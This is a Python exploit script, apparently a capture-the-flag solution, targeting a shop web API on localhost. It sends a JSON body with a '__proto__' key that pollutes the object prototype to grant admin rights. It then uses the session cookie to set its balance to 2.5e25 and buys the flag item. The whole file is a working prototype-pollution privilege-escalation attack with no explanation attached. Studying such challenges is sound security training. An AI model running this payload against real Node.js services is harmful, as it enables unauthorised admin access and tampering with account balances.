import requests

base_url = "http://localhost:3000/api/v1"


def become_admin():
    param1 = {
        "__proto__": {
            "admin": True
        }
    }
    res = requests.post(f"{base_url}/sell", json=param1, headers={"Content-Type": "application/json"})

    return res.headers['set-cookie'].split("; ")[0]


def get_money(cookie):
    param2 = {
        "money": 2.5e25
    }
    res = requests.post(f"{base_url}/money", json=param2, headers={"Cookie": cookie, "Content-Type": "application/json"})


def buy_flag(cookie):
    param3 = {
        "fruit": "grass",
        "quantity": 1
    }
    res = requests.post(f"{base_url}/buy", json=param3, headers={"Cookie": cookie, "Content-Type": "application/json"})
    return res.text


def main():
    cookie = become_admin()
    get_money(cookie)
    flag = buy_flag(cookie)
    print(flag)

main()